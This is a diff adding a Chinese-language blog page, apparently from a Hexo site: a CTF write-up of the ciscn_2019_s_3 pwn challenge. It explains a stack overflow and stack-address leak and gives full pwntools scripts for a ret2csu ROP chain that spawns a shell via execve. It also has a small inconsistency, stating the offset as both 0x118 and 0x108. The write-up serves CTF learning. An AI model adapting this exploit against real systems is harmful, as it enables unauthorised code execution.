@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="ciscn_2019_s_3首先拿到程序先查看一下程序类型是一个x86-64的ELF文件，查看一下保护，只开启了堆栈不可执行保护用IDA分析一下该程序  main函数直接进入到vuln函数，这里利用了系统调用，64位的系统调用的传参方式为首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器vuln函数执行了read(0,buf,0x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sys_call">
+<meta property="og:url" content="http://example.com/2023/06/06/sys-call/index.html">
+<meta property="og:site_name" content="Dvgd">
+<meta property="og:description" content="ciscn_2019_s_3首先拿到程序先查看一下程序类型是一个x86-64的ELF文件，查看一下保护，只开启了堆栈不可执行保护用IDA分析一下该程序  main函数直接进入到vuln函数，这里利用了系统调用，64位的系统调用的传参方式为首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器vuln函数执行了read(0,buf,0x">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/sys-call/20201229184455278.png">
+<meta property="og:image" content="http://example.com/images/sys-call/20201229184558954.png">
+<meta property="og:image" content="http://example.com/images/sys-call/20201229184735411.png">
+<meta property="og:image" content="http://example.com/images/sys-call/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NjkxMjk0,size_16,color_FFFFFF,t_70.png">
+<meta property="og:image" content="http://example.com/images/sys-call/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NjkxMjk0,size_16,color_FFFFFF,t_70-16860615274691.png">
+<meta property="og:image" content="http://example.com/images/sys-call/20201229194027258.png">
+<meta property="og:image" content="http://example.com/images/sys-call/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NjkxMjk0,size_16,color_FFFFFF,t_70-16860615274692.png">
+<meta property="og:image" content="http://example.com/images/sys-call/20201229194555603.png">
+<meta property="og:image" content="http://example.com/images/sys-call/20201229194803897.png">
+<meta property="og:image" content="http://example.com/images/sys-call/20201229195459517.png">
+<meta property="article:published_time" content="2023-06-06T14:25:13.000Z">
+<meta property="article:modified_time" content="2023-06-06T14:25:51.547Z">
+<meta property="article:author" content="Dvgd">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/sys-call/20201229184455278.png">
+
+<link rel="canonical" href="http://example.com/2023/06/06/sys-call/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>sys_call | Dvgd</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Dvgd</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Dvgd</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签<span class="badge">2</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类<span class="badge">7</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">36</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/06/sys-call/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Dvgd.jpg">
+      <meta itemprop="name" content="Dvgd">
+      <meta itemprop="description" content="Welcome to my blog.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dvgd">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sys_call
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-06-06 22:25:13 / 修改时间：22:25:51" itemprop="dateCreated datePublished" datetime="2023-06-06T22:25:13+08:00">2023-06-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>首先拿到程序先查看一下程序类型<br><img src="/../images/sys-call/20201229184455278.png" alt="在这里插入图片描述"><br>是一个x86-64的ELF文件，查看一下保护，只开启了堆栈不可执行保护<br><img src="/../images/sys-call/20201229184558954.png" alt="在这里插入图片描述"><br>用IDA分析一下该程序</p>
+<p><img src="/../images/sys-call/20201229184735411.png" alt="在这里插入图片描述"></p>
+<p><img src="/../images/sys-call/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NjkxMjk0,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"><br>main函数直接进入到vuln函数，这里利用了系统调用，64位的系统调用的传参方式为<br><code>首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器</code><br>vuln函数执行了read(0,buf,0x400)，又执行了write(1,buf,0x30)。看一下buf的位置，发现距离rbp只有0x10大小，存在栈溢出<br>这里的栈溢出需要注意一点，在vuln函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pop rbp</span><br><span class="line"></span><br><span class="line">mov rbp，rsp</span><br><span class="line"></span><br><span class="line">程序结束的时候直接是：</span><br><span class="line"></span><br><span class="line">retn</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure>
+
+<p>注意！！！这里的retn是0x400519的retn，执行这个其实就跳出这个函数了。</p>
+<p>而retn是做什么的呢？retn的操作是内 pop eip，然后执行eip指向的指令。</p>
+<p>函数调用开始，rbp&#x3D;&#x3D;rsp，并且值也一直没变过，所以这里覆盖rbp的时候，其实就需要将rbp覆盖成你想要的返回地址。所以这道题的偏移其实就是0x10就可以了！<br>通俗一点说，就是函数执行完毕后，eip的值就会等于ebp，所以ebp可以覆盖成想要的返回地址</p>
+<p>在IDA中，我们还可以发现一个函数<code>gadgets</code>，查看一下它的汇编代码<br><img src="/../images/sys-call/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NjkxMjk0,size_16,color_FFFFFF,t_70-16860615274691.png" alt="在这里插入图片描述"><br>这里又出现了两个系统调用，查看一下调用号<br><code>stub_execve 的调用号 为 59(0x3B) stub_rt_sigreturn 的调用号 为 15(0x0F)</code>，并且赋值给rax后面接着retn</p>
+<p>这里有两种解法，先给出<code>ret2csu</code>的解法<br>解法一：ret2csu<br><code>通过系统调用59对应的execve，然后想办法执行execve(&quot;/bin/sh&quot;,0,0)</code><br>上面说到了可以进行栈溢出，执行execve就需要给寄存器赋值，那大概的布局就是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$rax==59</span><br><span class="line"></span><br><span class="line">$rdi==“/bin/sh”</span><br><span class="line"></span><br><span class="line">$rsi==0</span><br><span class="line"></span><br><span class="line">$rdx==0</span><br><span class="line"></span><br><span class="line">syscall</span><br><span class="line">123456789</span><br></pre></td></tr></table></figure>
+
+<p>那这里，首先需要解决的问题是要给rdi寄存器放入”&#x2F;bin&#x2F;sh”字符串的地址，那这里必须要leak栈地址，然后通过固定的相对偏移得到”&#x2F;bin&#x2F;sh”地址<br>通过<code>vuln</code>函数我们可以知道，write函数的buf距离ebp只有0x10的大小，却可以打印0x30大小的内容，那必然会打印出0x20大小的栈上的内容，只要打印出栈地址，只要算出该地址的偏移和&#x2F;bin&#x2F;sh的相对偏移，那就可以在程序每次执行的时候知道&#x2F;bin&#x2F;sh的地址了<br>通过调试我们来计算这个相对偏移<br>先在主函数下一个断点<br><img src="/../images/sys-call/20201229194027258.png" alt="在这里插入图片描述"><br>运行之后，查看一下初始时寄存器的内容，在main函数开始时rsi存的便是栈地址，为0x00007fffffffdfc8<br><img src="/../images/sys-call/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NjkxMjk0,size_16,color_FFFFFF,t_70-16860615274692.png" alt="在这里插入图片描述"><br>输入c继续执行，这里输入8个a，方便确定输入在栈的位置<br><img src="/../images/sys-call/20201229194555603.png" alt="在这里插入图片描述"><br>用<code>find</code>命令或者<code>search</code>命令寻找输入的8个字节所在位置，此时处于栈中的0x7fffffffdeb0地址上<br><img src="/../images/sys-call/20201229194803897.png" alt="在这里插入图片描述"><br>然后查看一下这段内存，<code>x/8gx 0x7fffffffdeb0</code><br><img src="/../images/sys-call/20201229195459517.png" alt="在这里插入图片描述"><br>根据刚才的分析可得，0x7fffffffdeb0后面栈上0x20大小的内容会leak</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7fffffffdec0:	0x00007fffffffdee0	0x0000000000400536</span><br><span class="line">0x7fffffffded0:	0x00007fffffffdfc8	0x0000000100000000</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
+
+<p>而0x00007fffffffdfc8就是栈地址，也就是进入main函数时的rsi<br>栈地址-字符串在栈中的地址 &#x3D; offset<br>0x00007fffffffdfc8 - 0x7fffffffdeb0 &#x3D; 0x118<br>所以，相对偏移为0x108<br>下面是调试的python代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">csu_end = <span class="number">0x040059A</span></span><br><span class="line">csu_front = <span class="number">0x0400580</span></span><br><span class="line">ret_addr = <span class="number">0x004003a9</span></span><br><span class="line">rax_59_ret = <span class="number">0x04004E2</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x00400589&#x27;)</span></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">0x8</span> + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack_addr--&gt;&#x27;</span> + <span class="built_in">hex</span>(stack_addr)</span><br><span class="line">pause()</span><br><span class="line"><span class="number">12345678910111213141516171819</span></span><br></pre></td></tr></table></figure>
+
+<p>所以整体逻辑就是：泄露出&#x2F;bin&#x2F;sh的地址，然后用pop_rbx_rbp_r12_r13_r14_r15 , 将r12写入mov rax 3bh ; ret 然后通过 mov_rdx_r13_call 执行 call r12 。我们发现 [bin_sh_addr + 0x50]的地址是<br>mov rax 3bh ; ret 。然后我们跳转到pop rdi ; ret 将binsh压到rdi，然后执行syscall<br>此时rax为59 rdi为 &#x2F;bin&#x2F;sh 所以会执行system(“&#x2F;bin&#x2F;sh”)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;ciscn_s_3&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./ciscn_s_3&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node3.buuoj.cn&quot;,25673)</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15 = <span class="number">0x0040059A</span></span><br><span class="line">mov_rdx_r13_call = <span class="number">0x0400580</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x04005A3</span></span><br><span class="line">vuln_addr = <span class="number">0x0004004ED</span></span><br><span class="line">sysecve_addr = <span class="number">0x004004E2</span></span><br><span class="line">syscall_addr =<span class="number">0x400501</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span> * <span class="number">0x8</span> + p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">binsh = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(binsh)</span><br><span class="line">payload = <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&quot;a&quot;</span>*<span class="number">0x8</span></span><br><span class="line">payload += p64(pop_rbx_rbp_r12_r13_r14_r15)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(binsh+<span class="number">0x50</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span>  <span class="comment">#这里不能直接把/bin/sh通过csu给rdi寄存器，这里只能控制rdi的低32位edi</span></span><br><span class="line">payload += p64(mov_rdx_r13_call)</span><br><span class="line">payload += p64(sysecve_addr)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="number">1234567891011121314151617181920212223242526272829</span></span><br></pre></td></tr></table></figure>
+
+<p>其实这里很多地方是通过调试才得到的，所以，还是要多学习调试，多理解程序运行的机制，再回来调试此题，这样会有更好的理解<br>这里给出一篇其它师傅的<a target="_blank" rel="noopener" href="https://www.yuque.com/hshs/pwnup/ig96em">文章</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/106014234">ctf中关于syscall系统调用的简单分析</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/06/05/UAF/" rel="prev" title="UAF">
+      <i class="fa fa-chevron-left"></i> UAF
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/06/23/asm-to-elf/" rel="next" title="asm_to_elf">
+      asm_to_elf <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ciscn-2019-s-3"><span class="nav-number">1.</span> <span class="nav-text">ciscn_2019_s_3</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Dvgd"
+      src="/images/Dvgd.jpg">
+  <p class="site-author-name" itemprop="name">Dvgd</p>
+  <div class="site-description" itemprop="description">Welcome to my blog.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yourname" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yourname" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/yourname" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;yourname" rel="noopener" target="_blank"><i class="weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+      </div>
+	   <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1861579836&auto=1&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Dvgd</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+
+</body>
+</html>
+<!-- 引入jQuery -->
+<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<!-- 雪花特效2 -->
+<script type="text/javascript" src="/js/snow2.js"></script>
+
+<!-- 樱花特效 -->
+  
+      <script async src="/js/fairyDustCursor.js"></script>
+  
+
+
